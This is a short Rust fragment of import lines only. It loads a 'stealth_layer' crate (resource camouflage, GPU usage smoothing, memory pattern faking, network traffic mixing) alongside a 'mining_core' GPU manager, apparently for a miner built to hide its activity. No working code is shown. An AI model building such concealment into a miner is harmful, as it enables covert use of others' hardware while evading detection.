use std::time::{Duration, Instant};
use tokio::time::sleep;
use tokio::sync::broadcast;
use rand::prelude::*;
use std::sync::Arc;
use parking_lot::Mutex as ParkingMutex;

use stealth_layer::{
    ResourceCamouflageConfig, NetworkMixerConfig, GpuUsageSmoother, SmootherConfig,
    MemoryPatternFaker, AllocationStrategy, NetworkTrafficMixer, SmootherStats,
    PaddingConfig,
};
use mining_core::GpuManager;